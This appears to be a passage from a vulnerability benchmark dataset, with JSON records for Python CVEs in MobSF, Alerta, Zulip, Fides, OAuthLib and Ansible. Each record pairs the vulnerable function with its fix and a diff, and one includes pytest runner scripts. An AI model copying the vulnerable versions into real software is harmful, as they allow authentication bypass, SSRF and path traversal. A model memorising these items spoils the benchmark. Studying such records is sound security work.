        "snippet": "def firebase_analysis(urls):\n    # Detect Firebase URL\n    firebase_db = []\n    logger.info('Detecting Firebase URL(s)')\n    for url in urls:\n        if 'firebaseio.com' in url:\n            returl, is_open = open_firebase(url)\n            fbdic = {'url': returl, 'open': is_open}\n            if fbdic not in firebase_db:\n                firebase_db.append(fbdic)\n    return firebase_db"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_239_1",
        "commit": "43bb71d",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 255,
        "end_line": 279,
        "snippet": "def open_firebase(url):\n    # Detect Open Firebase Database\n    try:\n        invalid = 'Invalid Firebase URL'\n        if not valid_host(url):\n            logger.warning(invalid)\n            return url, False\n        purl = urlparse(url)\n        if not purl.netloc.endswith('firebaseio.com'):\n            logger.warning(invalid)\n            return url, False\n        base_url = '{}://{}/.json'.format(purl.scheme, purl.netloc)\n        proxies, verify = upstream_proxy('https')\n        headers = {\n            'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1)'\n                           ' AppleWebKit/537.36 (KHTML, like Gecko) '\n                           'Chrome/39.0.2171.95 Safari/537.36')}\n        resp = requests.get(base_url, headers=headers,\n                            proxies=proxies, verify=verify,\n                            allow_redirects=False)\n        if resp.status_code == 200:\n            return base_url, True\n    except Exception:\n        logger.warning('Open Firebase DB detection failed.')\n    return url, False"
      },
      {
        "id": "fix_py_239_2",
        "commit": "43bb71d",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 282,
        "end_line": 293,
        "snippet": "def firebase_analysis(urls):\n    # Detect Firebase URL\n    firebase_db = []\n    logger.info('Detecting Firebase URL(s)')\n    for url in urls:\n        if 'firebaseio.com' not in url:\n            continue\n        returl, is_open = open_firebase(url)\n        fbdic = {'url': returl, 'open': is_open}\n        if fbdic not in firebase_db:\n            firebase_db.append(fbdic)\n    return firebase_db"
      }
    ],
    "vul_patch": "--- a/mobsf/StaticAnalyzer/views/common/shared_func.py\n+++ b/mobsf/StaticAnalyzer/views/common/shared_func.py\n@@ -1,10 +1,14 @@\n def open_firebase(url):\n     # Detect Open Firebase Database\n     try:\n+        invalid = 'Invalid Firebase URL'\n         if not valid_host(url):\n-            logger.warning('Invalid Firebase URL')\n+            logger.warning(invalid)\n             return url, False\n         purl = urlparse(url)\n+        if not purl.netloc.endswith('firebaseio.com'):\n+            logger.warning(invalid)\n+            return url, False\n         base_url = '{}://{}/.json'.format(purl.scheme, purl.netloc)\n         proxies, verify = upstream_proxy('https')\n         headers = {\n@@ -12,7 +16,8 @@\n                            ' AppleWebKit/537.36 (KHTML, like Gecko) '\n                            'Chrome/39.0.2171.95 Safari/537.36')}\n         resp = requests.get(base_url, headers=headers,\n-                            proxies=proxies, verify=verify)\n+                            proxies=proxies, verify=verify,\n+                            allow_redirects=False)\n         if resp.status_code == 200:\n             return base_url, True\n     except Exception:\n\n--- a/mobsf/StaticAnalyzer/views/common/shared_func.py\n+++ b/mobsf/StaticAnalyzer/views/common/shared_func.py\n@@ -3,9 +3,10 @@\n     firebase_db = []\n     logger.info('Detecting Firebase URL(s)')\n     for url in urls:\n-        if 'firebaseio.com' in url:\n-            returl, is_open = open_firebase(url)\n-            fbdic = {'url': returl, 'open': is_open}\n-            if fbdic not in firebase_db:\n-                firebase_db.append(fbdic)\n+        if 'firebaseio.com' not in url:\n+            continue\n+        returl, is_open = open_firebase(url)\n+        fbdic = {'url': returl, 'open': is_open}\n+        if fbdic not in firebase_db:\n+            firebase_db.append(fbdic)\n     return firebase_db\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-26214",
    "cve_description": "In Alerta before version 8.1.0, users may be able to bypass LDAP authentication if they provide an empty password when Alerta server is configure to use LDAP as the authorization provider. Only deployments where LDAP servers are configured to allow unauthenticated authentication mechanism for anonymous authorization are affected. A fix has been implemented in version 8.1.0 that returns HTTP 401 Unauthorized response for any authentication attempts where the password field is empty. As a workaround LDAP administrators can disallow unauthenticated bind requests by clients.",
    "cwe_info": {
      "CWE-287": {
        "name": "Improper Authentication",
        "description": "When an actor claims to have a given identity, the product does not prove or insufficiently proves that the claim is correct."
      }
    },
    "repo": "https://github.com/alerta/alerta",
    "patch_url": [
      "https://github.com/alerta/alerta/commit/2bfa31779a4c9df2fa68fa4d0c5c909698c5ef65"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_237_1",
        "commit": "b3a9698",
        "file_path": "alerta/auth/basic_ldap.py",
        "start_line": 18,
        "end_line": 111,
        "snippet": "def login():\n    # Allow LDAP server to use a self signed certificate\n    if current_app.config['LDAP_ALLOW_SELF_SIGNED_CERT']:\n        ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_ALLOW)\n\n    # Retrieve required fields from client request\n    try:\n        login = request.json.get('username', None) or request.json['email']\n        password = request.json['password']\n    except KeyError:\n        raise ApiError(\"must supply 'username' and 'password'\", 401)\n\n    try:\n        if '\\\\' in login:\n            domain, username = login.split('\\\\')\n            email = ''\n            email_verified = False\n        else:\n            username, domain = login.split('@')\n            email = login\n            email_verified = True\n    except ValueError:\n        raise ApiError('expected username with domain', 401)\n\n    # Validate LDAP domain\n    if domain not in current_app.config['LDAP_DOMAINS']:\n        raise ApiError('unauthorized domain', 403)\n\n    userdn = current_app.config['LDAP_DOMAINS'][domain] % username\n\n    # Attempt LDAP AUTH\n    try:\n        trace_level = 2 if current_app.debug else 0\n        ldap_connection = ldap.initialize(current_app.config['LDAP_URL'], trace_level=trace_level)\n        ldap_connection.simple_bind_s(userdn, password)\n    except ldap.INVALID_CREDENTIALS:\n        raise ApiError('invalid username or password', 401)\n    except Exception as e:\n        raise ApiError(str(e), 500)\n\n    # Get email address from LDAP\n    if not email_verified:\n        try:\n            ldap_result = ldap_connection.search_s(userdn, ldap.SCOPE_SUBTREE, '(objectClass=*)', ['mail'])\n            email = ldap_result[0][1]['mail'][0].decode(sys.stdout.encoding)\n            email_verified = True\n        except Exception:\n            email = '{}@{}'.format(username, domain)\n\n    # Create user if not yet there\n    user = User.find_by_username(username=login)\n    if not user:\n        user = User(name=username, login=login, password='', email=email,\n                    roles=[], text='LDAP user', email_verified=email_verified)\n        try:\n            user = user.create()\n        except Exception as e:\n            ApiError(str(e), 500)\n\n    # Assign customers & update last login time\n    groups = list()\n    try:\n        groups_filters = current_app.config.get('LDAP_DOMAINS_GROUP', {})\n        base_dns = current_app.config.get('LDAP_DOMAINS_BASEDN', {})\n        if domain in groups_filters and domain in base_dns:\n            resultID = ldap_connection.search(\n                base_dns[domain],\n                ldap.SCOPE_SUBTREE,\n                groups_filters[domain].format(username=username, email=email, userdn=userdn),\n                ['cn']\n            )\n            resultTypes, results = ldap_connection.result(resultID)\n            for _dn, attributes in results:\n                groups.append(attributes['cn'][0].decode('utf-8'))\n    except ldap.LDAPError as e:\n        raise ApiError(str(e), 500)\n\n    # Check user is active\n    if user.status != 'active':\n        raise ApiError('User {} not active'.format(login), 403)\n    user.update_last_login()\n\n    scopes = Permission.lookup(login=login, roles=user.roles + groups)\n    customers = get_customers(login=login, groups=[user.domain] + groups)\n\n    auth_audit_trail.send(current_app._get_current_object(), event='basic-ldap-login', message='user login via LDAP',\n                          user=login, customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                          resource_id=user.id, type='user', request=request)\n\n    # Generate token\n    token = create_token(user_id=user.id, name=user.name, login=user.email, provider='ldap',\n                         customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                         email=user.email, email_verified=user.email_verified)\n    return jsonify(token=token.tokenize)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_237_1",
        "commit": "2bfa317",
        "file_path": "alerta/auth/basic_ldap.py",
        "start_line": 18,
        "end_line": 114,
        "snippet": "def login():\n    # Allow LDAP server to use a self signed certificate\n    if current_app.config['LDAP_ALLOW_SELF_SIGNED_CERT']:\n        ldap.set_option(ldap.OPT_X_TLS_REQUIRE_CERT, ldap.OPT_X_TLS_ALLOW)\n\n    # Retrieve required fields from client request\n    try:\n        login = request.json.get('username', None) or request.json['email']\n        password = request.json['password']\n    except KeyError:\n        raise ApiError(\"must supply 'username' and 'password'\", 401)\n\n    if not password:\n        raise ApiError('password not allowed to be empty', 401)\n\n    try:\n        if '\\\\' in login:\n            domain, username = login.split('\\\\')\n            email = ''\n            email_verified = False\n        else:\n            username, domain = login.split('@')\n            email = login\n            email_verified = True\n    except ValueError:\n        raise ApiError('expected username with domain', 401)\n\n    # Validate LDAP domain\n    if domain not in current_app.config['LDAP_DOMAINS']:\n        raise ApiError('unauthorized domain', 403)\n\n    userdn = current_app.config['LDAP_DOMAINS'][domain] % username\n\n    # Attempt LDAP AUTH\n    try:\n        trace_level = 2 if current_app.debug else 0\n        ldap_connection = ldap.initialize(current_app.config['LDAP_URL'], trace_level=trace_level)\n        ldap_connection.simple_bind_s(userdn, password)\n    except ldap.INVALID_CREDENTIALS:\n        raise ApiError('invalid username or password', 401)\n    except Exception as e:\n        raise ApiError(str(e), 500)\n\n    # Get email address from LDAP\n    if not email_verified:\n        try:\n            ldap_result = ldap_connection.search_s(userdn, ldap.SCOPE_SUBTREE, '(objectClass=*)', ['mail'])\n            email = ldap_result[0][1]['mail'][0].decode(sys.stdout.encoding)\n            email_verified = True\n        except Exception:\n            email = '{}@{}'.format(username, domain)\n\n    # Create user if not yet there\n    user = User.find_by_username(username=login)\n    if not user:\n        user = User(name=username, login=login, password='', email=email,\n                    roles=[], text='LDAP user', email_verified=email_verified)\n        try:\n            user = user.create()\n        except Exception as e:\n            ApiError(str(e), 500)\n\n    # Assign customers & update last login time\n    groups = list()\n    try:\n        groups_filters = current_app.config.get('LDAP_DOMAINS_GROUP', {})\n        base_dns = current_app.config.get('LDAP_DOMAINS_BASEDN', {})\n        if domain in groups_filters and domain in base_dns:\n            resultID = ldap_connection.search(\n                base_dns[domain],\n                ldap.SCOPE_SUBTREE,\n                groups_filters[domain].format(username=username, email=email, userdn=userdn),\n                ['cn']\n            )\n            resultTypes, results = ldap_connection.result(resultID)\n            for _dn, attributes in results:\n                groups.append(attributes['cn'][0].decode('utf-8'))\n    except ldap.LDAPError as e:\n        raise ApiError(str(e), 500)\n\n    # Check user is active\n    if user.status != 'active':\n        raise ApiError('User {} not active'.format(login), 403)\n    user.update_last_login()\n\n    scopes = Permission.lookup(login=login, roles=user.roles + groups)\n    customers = get_customers(login=login, groups=[user.domain] + groups)\n\n    auth_audit_trail.send(current_app._get_current_object(), event='basic-ldap-login', message='user login via LDAP',\n                          user=login, customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                          resource_id=user.id, type='user', request=request)\n\n    # Generate token\n    token = create_token(user_id=user.id, name=user.name, login=user.email, provider='ldap',\n                         customers=customers, scopes=scopes, roles=user.roles, groups=groups,\n                         email=user.email, email_verified=user.email_verified)\n    return jsonify(token=token.tokenize)"
      }
    ],
    "vul_patch": "--- a/alerta/auth/basic_ldap.py\n+++ b/alerta/auth/basic_ldap.py\n@@ -9,6 +9,9 @@\n         password = request.json['password']\n     except KeyError:\n         raise ApiError(\"must supply 'username' and 'password'\", 401)\n+\n+    if not password:\n+        raise ApiError('password not allowed to be empty', 401)\n \n     try:\n         if '\\\\' in login:\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-21630",
    "cve_description": "Zulip is an open-source team collaboration tool. A vulnerability in version 8.0 is similar to CVE-2023-32677, but applies to multi-use invitations, not single-use invitation links as in the prior CVE. Specifically, it applies when the installation has configured non-admins to be able to invite users and create multi-use invitations, and has also configured only admins to be able to invite users to streams. As in CVE-2023-32677, this does not let users invite new users to arbitrary streams, only to streams that the inviter can already see. Version 8.1 fixes this issue. As a workaround, administrators can limit sending of invitations down to users who also have the permission to add users to streams.",
    "cwe_info": {
      "CWE-862": {
        "name": "Missing Authorization",
        "description": "The product does not perform an authorization check when an actor attempts to access a resource or perform an action."
      }
    },
    "repo": "https://github.com/zulip/zulip",
    "patch_url": [
      "https://github.com/zulip/zulip/commit/0df7bd71f32f3b772e2646c6ab0d60c9b610addf"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_275_1",
        "commit": "bfcde65",
        "file_path": "zerver/views/invite.py",
        "start_line": 190,
        "end_line": 232,
        "snippet": "def generate_multiuse_invite_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    invite_expires_in_minutes: Optional[int] = REQ(\n        json_validator=check_none_or(check_int), default=INVITATION_LINK_VALIDITY_MINUTES\n    ),\n    invite_as: int = REQ(\n        json_validator=check_int_in(\n            list(PreregistrationUser.INVITE_AS.values()),\n        ),\n        default=PreregistrationUser.INVITE_AS[\"MEMBER\"],\n    ),\n    stream_ids: Sequence[int] = REQ(json_validator=check_list(check_int), default=[]),\n) -> HttpResponse:\n    if not user_profile.can_create_multiuse_invite_to_realm():\n        # Guest users case will not be handled here as it will\n        # be handled by the decorator above.\n        raise JsonableError(_(\"Insufficient permission\"))\n\n    require_admin = invite_as in [\n        # Owners can only be invited by owners, checked by separate\n        # logic in check_role_based_permissions.\n        PreregistrationUser.INVITE_AS[\"REALM_OWNER\"],\n        PreregistrationUser.INVITE_AS[\"REALM_ADMIN\"],\n        PreregistrationUser.INVITE_AS[\"MODERATOR\"],\n    ]\n    check_role_based_permissions(invite_as, user_profile, require_admin=require_admin)\n\n    streams = []\n    for stream_id in stream_ids:\n        try:\n            (stream, sub) = access_stream_by_id(user_profile, stream_id)\n        except JsonableError:\n            raise JsonableError(\n                _(\"Invalid stream ID {stream_id}. No invites were sent.\").format(\n                    stream_id=stream_id\n                )\n            )\n        streams.append(stream)\n\n    invite_link = do_create_multiuse_invite_link(\n        user_profile, invite_as, invite_expires_in_minutes, streams\n    )"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_275_1",
        "commit": "0df7bd71f32f3b772e2646c6ab0d60c9b610addf",
        "file_path": "zerver/views/invite.py",
        "start_line": 190,
        "end_line": 235,
        "snippet": "def generate_multiuse_invite_backend(\n    request: HttpRequest,\n    user_profile: UserProfile,\n    invite_expires_in_minutes: Optional[int] = REQ(\n        json_validator=check_none_or(check_int), default=INVITATION_LINK_VALIDITY_MINUTES\n    ),\n    invite_as: int = REQ(\n        json_validator=check_int_in(\n            list(PreregistrationUser.INVITE_AS.values()),\n        ),\n        default=PreregistrationUser.INVITE_AS[\"MEMBER\"],\n    ),\n    stream_ids: Sequence[int] = REQ(json_validator=check_list(check_int), default=[]),\n) -> HttpResponse:\n    if not user_profile.can_create_multiuse_invite_to_realm():\n        # Guest users case will not be handled here as it will\n        # be handled by the decorator above.\n        raise JsonableError(_(\"Insufficient permission\"))\n\n    require_admin = invite_as in [\n        # Owners can only be invited by owners, checked by separate\n        # logic in check_role_based_permissions.\n        PreregistrationUser.INVITE_AS[\"REALM_OWNER\"],\n        PreregistrationUser.INVITE_AS[\"REALM_ADMIN\"],\n        PreregistrationUser.INVITE_AS[\"MODERATOR\"],\n    ]\n    check_role_based_permissions(invite_as, user_profile, require_admin=require_admin)\n\n    streams = []\n    for stream_id in stream_ids:\n        try:\n            (stream, sub) = access_stream_by_id(user_profile, stream_id)\n        except JsonableError:\n            raise JsonableError(\n                _(\"Invalid stream ID {stream_id}. No invites were sent.\").format(\n                    stream_id=stream_id\n                )\n            )\n        streams.append(stream)\n\n    if len(streams) and not user_profile.can_subscribe_other_users():\n        raise JsonableError(_(\"You do not have permission to subscribe other users to streams.\"))\n\n    invite_link = do_create_multiuse_invite_link(\n        user_profile, invite_as, invite_expires_in_minutes, streams\n    )"
      }
    ],
    "vul_patch": "--- a/zerver/views/invite.py\n+++ b/zerver/views/invite.py\n@@ -38,6 +38,9 @@\n             )\n         streams.append(stream)\n \n+    if len(streams) and not user_profile.can_subscribe_other_users():\n+        raise JsonableError(_(\"You do not have permission to subscribe other users to streams.\"))\n+\n     invite_link = do_create_multiuse_invite_link(\n         user_profile, invite_as, invite_expires_in_minutes, streams\n     )\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-46124",
    "cve_description": "Fides is an open-source privacy engineering platform for managing the fulfillment of data privacy requests in runtime environments, and the enforcement of privacy regulations in code. The Fides web application allows a custom integration to be uploaded as a ZIP file containing configuration and dataset definitions in YAML format. It was discovered that specially crafted YAML dataset and config files allow a malicious user to perform arbitrary requests to internal systems and exfiltrate data outside the environment (also known as a Server-Side Request Forgery). The application does not perform proper validation to block attempts to connect to internal (including localhost) resources. The vulnerability has been patched in Fides version `2.22.1`. ",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/ethyca/fides",
    "patch_url": [
      "https://github.com/ethyca/fides/commit/cd344d016b1441662a61d0759e7913e8228ed1ee"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_165_1",
        "commit": "3231d19",
        "file_path": "src/fides/api/service/connectors/saas/authenticated_client.py",
        "start_line": 189,
        "end_line": 224,
        "snippet": "    def send(\n        self,\n        request_params: SaaSRequestParams,\n        ignore_errors: Optional[Union[bool, List[int]]] = False,\n    ) -> Response:\n        \"\"\"\n        Builds and executes an authenticated request.\n        Optionally ignores:\n          - all non-2xx/3xx responses if ignore_errors is set to True\n          - no non-2xx/3xx repsones if ignore_errors is set to False\n          - specific non-2xx/3xx responses if ignore_errors is set to a list of status codes\n        \"\"\"\n        rate_limit_requests = self.build_rate_limit_requests()\n        RateLimiter().limit(rate_limit_requests)\n\n        prepared_request: PreparedRequest = self.get_authenticated_request(\n            request_params\n        )\n        response = self.session.send(prepared_request)\n\n        log_request_and_response_for_debugging(\n            prepared_request, response\n        )  # Dev mode only\n\n        if not response.ok:\n            if self._should_ignore_error(\n                status_code=response.status_code,\n                errors_to_ignore=ignore_errors,\n            ):\n                logger.info(\n                    \"Ignoring errors on response with status code {} as configured.\",\n                    response.status_code,\n                )\n                return response\n            raise RequestFailureResponseException(response=response)\n        return response"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_165_1",
        "commit": "cd344d0",
        "file_path": "src/fides/api/service/connectors/saas/authenticated_client.py",
        "start_line": 191,
        "end_line": 232,
        "snippet": "    def send(\n        self,\n        request_params: SaaSRequestParams,\n        ignore_errors: Optional[Union[bool, List[int]]] = False,\n    ) -> Response:\n        \"\"\"\n        Builds and executes an authenticated request.\n        Optionally ignores:\n          - all non-2xx/3xx responses if ignore_errors is set to True\n          - no non-2xx/3xx responses if ignore_errors is set to False\n          - specific non-2xx/3xx responses if ignore_errors is set to a list of status codes\n        \"\"\"\n        rate_limit_requests = self.build_rate_limit_requests()\n        RateLimiter().limit(rate_limit_requests)\n\n        prepared_request: PreparedRequest = self.get_authenticated_request(\n            request_params\n        )\n        if not prepared_request.url:\n            raise ValueError(\"The URL for the prepared request is missing.\")\n\n        # extract the hostname from the complete URL and verify its safety\n        deny_unsafe_hosts(urlparse(prepared_request.url).netloc)\n\n        response = self.session.send(prepared_request)\n\n        log_request_and_response_for_debugging(\n            prepared_request, response\n        )  # Dev mode only\n\n        if not response.ok:\n            if self._should_ignore_error(\n                status_code=response.status_code,\n                errors_to_ignore=ignore_errors,\n            ):\n                logger.info(\n                    \"Ignoring errors on response with status code {} as configured.\",\n                    response.status_code,\n                )\n                return response\n            raise RequestFailureResponseException(response=response)\n        return response"
      },
      {
        "id": "fix_py_165_2",
        "commit": "cd344d0",
        "file_path": "src/fides/api/util/saas_util.py",
        "start_line": 30,
        "end_line": 48,
        "snippet": "def deny_unsafe_hosts(host: str) -> str:\n    \"\"\"\n    Verify that the provided host isn't a potentially unsafe one.\n\n    WARNING: IPv6 is _not_ supported and will throw an exception!\n    \"\"\"\n    if CONFIG.dev_mode:\n        return host\n\n    try:\n        host_ip: Union[IPv4Address, IPv6Address] = ip_address(\n            socket.gethostbyname(host)\n        )\n    except socket.gaierror:\n        raise ValueError(f\"Failed to resolve hostname: {host}\")\n\n    if host_ip.is_link_local or host_ip.is_loopback:\n        raise ValueError(f\"Host '{host}' with IP Address '{host_ip}' is not safe!\")\n    return host"
      }
    ],
    "vul_patch": "--- a/src/fides/api/service/connectors/saas/authenticated_client.py\n+++ b/src/fides/api/service/connectors/saas/authenticated_client.py\n@@ -7,7 +7,7 @@\n         Builds and executes an authenticated request.\n         Optionally ignores:\n           - all non-2xx/3xx responses if ignore_errors is set to True\n-          - no non-2xx/3xx repsones if ignore_errors is set to False\n+          - no non-2xx/3xx responses if ignore_errors is set to False\n           - specific non-2xx/3xx responses if ignore_errors is set to a list of status codes\n         \"\"\"\n         rate_limit_requests = self.build_rate_limit_requests()\n@@ -16,6 +16,12 @@\n         prepared_request: PreparedRequest = self.get_authenticated_request(\n             request_params\n         )\n+        if not prepared_request.url:\n+            raise ValueError(\"The URL for the prepared request is missing.\")\n+\n+        # extract the hostname from the complete URL and verify its safety\n+        deny_unsafe_hosts(urlparse(prepared_request.url).netloc)\n+\n         response = self.session.send(prepared_request)\n \n         log_request_and_response_for_debugging(\n\n--- /dev/null\n+++ b/src/fides/api/service/connectors/saas/authenticated_client.py\n@@ -0,0 +1,19 @@\n+def deny_unsafe_hosts(host: str) -> str:\n+    \"\"\"\n+    Verify that the provided host isn't a potentially unsafe one.\n+\n+    WARNING: IPv6 is _not_ supported and will throw an exception!\n+    \"\"\"\n+    if CONFIG.dev_mode:\n+        return host\n+\n+    try:\n+        host_ip: Union[IPv4Address, IPv6Address] = ip_address(\n+            socket.gethostbyname(host)\n+        )\n+    except socket.gaierror:\n+        raise ValueError(f\"Failed to resolve hostname: {host}\")\n+\n+    if host_ip.is_link_local or host_ip.is_loopback:\n+        raise ValueError(f\"Host '{host}' with IP Address '{host_ip}' is not safe!\")\n+    return host\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-36087",
    "cve_description": "OAuthLib is an implementation of the OAuth request-signing logic for Python 3.6+. In OAuthLib versions 3.1.1 until 3.2.1, an attacker providing malicious redirect uri can cause denial of service. An attacker can also leverage usage of `uri_validate` functions depending where it is used. OAuthLib applications using OAuth2.0 provider support or use directly `uri_validate` are affected by this issue. Version 3.2.1 contains a patch. There are no known workarounds.",
    "cwe_info": {
      "CWE-601": {
        "name": "URL Redirection to Untrusted Site ('Open Redirect')",
        "description": "The web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a redirect."
      }
    },
    "repo": "https://github.com/oauthlib/oauthlib",
    "patch_url": [
      "https://github.com/oauthlib/oauthlib/commit/2e40b412c844ecc4673c3fa3f72181f228bdbacd"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_57_1",
        "commit": "b4bdd09",
        "file_path": "oauthlib/uri_validate.py",
        "start_line": 68,
        "end_line": 69,
        "snippet": "#   IPv6address\nIPv6address = r\"([A-Fa-f0-9:]+:+)+[A-Fa-f0-9]+\""
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_57_1",
        "commit": "2e40b41",
        "file_path": "oauthlib/uri_validate.py",
        "start_line": 69,
        "end_line": 69,
        "snippet": "IPv6address = r\"([A-Fa-f0-9:]+[:$])[A-Fa-f0-9]{1,4}\""
      }
    ],
    "vul_patch": "--- a/oauthlib/uri_validate.py\n+++ b/oauthlib/uri_validate.py\n@@ -1,2 +1 @@\n-#   IPv6address\n-IPv6address = r\"([A-Fa-f0-9:]+:+)+[A-Fa-f0-9]+\"\n+IPv6address = r\"([A-Fa-f0-9:]+[:$])[A-Fa-f0-9]{1,4}\"\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-36087:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/oauthlib\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-36087/bin/python -m pytest tests/test_uri_validate.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-36087:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/oauthlib\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-36087/bin/python -m pytest tests/ -v -k \"not test_rsa_bad_keys\""
  },
  {
    "cve_id": "CVE-2023-5115",
    "cve_description": "An absolute path traversal attack exists in the Ansible automation platform. This flaw allows an attacker to craft a malicious Ansible role and make the victim execute the role. A symlink can be used to overwrite a file outside of the extraction path.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ansible/ansible",
    "patch_url": [
      "https://github.com/ansible/ansible/commit/1e930684bc0a76ec3d094cd326738ad26416541c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_364_1",
        "commit": "f87ed972e88e0d3feaf98ba4517199172a5c33d8",
        "file_path": "lib/ansible/galaxy/role.py",
        "start_line": 272,
        "end_line": 433,
        "snippet": "    def install(self):\n\n        if self.scm:\n            # create tar file from scm url\n            tmp_file = RoleRequirement.scm_archive_role(keep_scm_meta=context.CLIARGS['keep_scm_meta'], **self.spec)\n        elif self.src:\n            if os.path.isfile(self.src):\n                tmp_file = self.src\n            elif '://' in self.src:\n                role_data = self.src\n                tmp_file = self.fetch(role_data)\n            else:\n                role_data = self.api.lookup_role_by_name(self.src)\n                if not role_data:\n                    raise AnsibleError(\"- sorry, %s was not found on %s.\" % (self.src, self.api.api_server))\n\n                if role_data.get('role_type') == 'APP':\n                    # Container Role\n                    display.warning(\"%s is a Container App role, and should only be installed using Ansible \"\n                                    \"Container\" % self.name)\n\n                role_versions = self.api.fetch_role_related('versions', role_data['id'])\n                if not self.version:\n                    # convert the version names to LooseVersion objects\n                    # and sort them to get the latest version. If there\n                    # are no versions in the list, we'll grab the head\n                    # of the master branch\n                    if len(role_versions) > 0:\n                        loose_versions = [LooseVersion(a.get('name', None)) for a in role_versions]\n                        try:\n                            loose_versions.sort()\n                        except TypeError:\n                            raise AnsibleError(\n                                'Unable to compare role versions (%s) to determine the most recent version due to incompatible version formats. '\n                                'Please contact the role author to resolve versioning conflicts, or specify an explicit role version to '\n                                'install.' % ', '.join([v.vstring for v in loose_versions])\n                            )\n                        self.version = to_text(loose_versions[-1])\n                    elif role_data.get('github_branch', None):\n                        self.version = role_data['github_branch']\n                    else:\n                        self.version = 'master'\n                elif self.version != 'master':\n                    if role_versions and to_text(self.version) not in [a.get('name', None) for a in role_versions]:\n                        raise AnsibleError(\"- the specified version (%s) of %s was not found in the list of available versions (%s).\" % (self.version,\n                                                                                                                                         self.name,\n                                                                                                                                         role_versions))\n\n                # check if there's a source link/url for our role_version\n                for role_version in role_versions:\n                    if role_version['name'] == self.version and 'source' in role_version:\n                        self.src = role_version['source']\n                    if role_version['name'] == self.version and 'download_url' in role_version:\n                        self.download_url = role_version['download_url']\n\n                tmp_file = self.fetch(role_data)\n\n        else:\n            raise AnsibleError(\"No valid role data found\")\n\n        if tmp_file:\n\n            display.debug(\"installing from %s\" % tmp_file)\n\n            if not tarfile.is_tarfile(tmp_file):\n                raise AnsibleError(\"the downloaded file does not appear to be a valid tar archive.\")\n            else:\n                role_tar_file = tarfile.open(tmp_file, \"r\")\n                # verify the role's meta file\n                meta_file = None\n                members = role_tar_file.getmembers()\n                # next find the metadata file\n                for member in members:\n                    for meta_main in self.META_MAIN:\n                        if meta_main in member.name:\n                            # Look for parent of meta/main.yml\n                            # Due to possibility of sub roles each containing meta/main.yml\n                            # look for shortest length parent\n                            meta_parent_dir = os.path.dirname(os.path.dirname(member.name))\n                            if not meta_file:\n                                archive_parent_dir = meta_parent_dir\n                                meta_file = member\n                            else:\n                                if len(meta_parent_dir) < len(archive_parent_dir):\n                                    archive_parent_dir = meta_parent_dir\n                                    meta_file = member\n                if not meta_file:\n                    raise AnsibleError(\"this role does not appear to have a meta/main.yml file.\")\n                else:\n                    try:\n                        self._metadata = yaml_load(role_tar_file.extractfile(meta_file))\n                    except Exception:\n                        raise AnsibleError(\"this role does not appear to have a valid meta/main.yml file.\")\n\n                paths = self.paths\n                if self.path != paths[0]:\n                    # path can be passed though __init__\n                    # FIXME should this be done in __init__?\n                    paths[:0] = self.path\n                paths_len = len(paths)\n                for idx, path in enumerate(paths):\n                    self.path = path\n                    display.display(\"- extracting %s to %s\" % (self.name, self.path))\n                    try:\n                        if os.path.exists(self.path):\n                            if not os.path.isdir(self.path):\n                                raise AnsibleError(\"the specified roles path exists and is not a directory.\")\n                            elif not context.CLIARGS.get(\"force\", False):\n                                raise AnsibleError(\"the specified role %s appears to already exist. Use --force to replace it.\" % self.name)\n                            else:\n                                # using --force, remove the old path\n                                if not self.remove():\n                                    raise AnsibleError(\"%s doesn't appear to contain a role.\\n  please remove this directory manually if you really \"\n                                                       \"want to put the role here.\" % self.path)\n                        else:\n                            os.makedirs(self.path)\n\n                        # We strip off any higher-level directories for all of the files\n                        # contained within the tar file here. The default is 'github_repo-target'.\n                        # Gerrit instances, on the other hand, does not have a parent directory at all.\n                        for member in members:\n                            # we only extract files, and remove any relative path\n                            # bits that might be in the file for security purposes\n                            # and drop any containing directory, as mentioned above\n                            if member.isreg() or member.issym():\n                                n_member_name = 